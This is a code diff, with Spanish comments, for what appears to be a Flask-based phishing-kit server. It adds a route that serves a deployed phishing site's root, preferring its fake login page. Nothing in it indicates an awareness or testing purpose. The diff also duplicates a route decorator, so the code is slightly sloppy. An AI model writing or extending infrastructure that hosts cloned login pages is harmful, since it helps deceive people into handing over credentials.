@@ -287,6 +287,25 @@ def stop_site(site_name):
     return redirect(url_for('index'))
 
 @app.route('/phish/<site_name>/')
+@app.route('/phish/<site_name>/')
+def serve_phishing_site_root(site_name):
+    """Sirve la página principal del sitio de phishing"""
+    site_info = get_site_info(site_name)
+    if not site_info:
+        return f"Sitio '{site_name}' no encontrado", 404
+    
+    # Verificar que esté desplegado
+    if site_name not in deployed_sites:
+        return redirect(url_for('deploy_site', site_name=site_name))
+    
+    # Priorizar login.html sobre index.php para mejor visualización
+    if site_info['has_login']:
+        return serve_phishing_site(site_name, 'login.html')
+    elif site_info['has_index']:
+        return serve_phishing_site(site_name, 'index.php')
+    else:
+        return f"Sitio {site_name} activo - Archivos: {', '.join(site_info['files'])}"
+
 @app.route('/phish/<site_name>/<filename>')
 def serve_phishing_site(site_name, filename='index.php'):
     """Sirve el sitio de phishing como si fuera independiente"""
